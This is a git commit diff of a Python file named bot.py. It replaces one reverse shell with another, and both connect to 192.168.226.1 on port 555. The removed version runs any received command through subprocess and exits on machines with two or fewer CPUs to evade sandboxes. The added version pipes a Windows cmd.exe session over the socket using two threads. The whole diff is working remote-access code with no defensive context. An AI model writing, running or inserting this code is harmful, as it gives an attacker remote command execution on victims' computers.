214df2ffaf0088712c8391807b49032236ecf265
RookieCi <144260068+RookieCi@users.noreply.github.com>
2023-09-07 15:50:40 +0200

    Update bot.py5

--- bot.py
+++ bot.py
@@ -1,34 +1,29 @@
-def run():
- import os
-import socket
-import subprocess
-
-
-if os.cpu_count() <= 2:
-    quit()
-
-HOST = '192.168.226.1'
-PORT = 555
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
-s.send(str.encode("[*] Connection Established!"))
-
-while 1:
-    try:
-        s.send(str.encode(os.getcwd() + "> "))
-        data = s.recv(1024).decode("UTF-8")
-        data = data.strip('\n')
-        if data == "quit": 
-            break
-        if data[:2] == "cd":
-            os.chdir(data[3:])
+import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
         if len(data) > 0:
-            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
-            stdout_value = proc.stdout.read() + proc.stderr.read()
-            output_str = str(stdout_value, "UTF-8")
-            s.send(str.encode("\n" + output_str))
-    except Exception as e:
-        continue
-    
-s.close()
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.226.1",555))
+
+p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
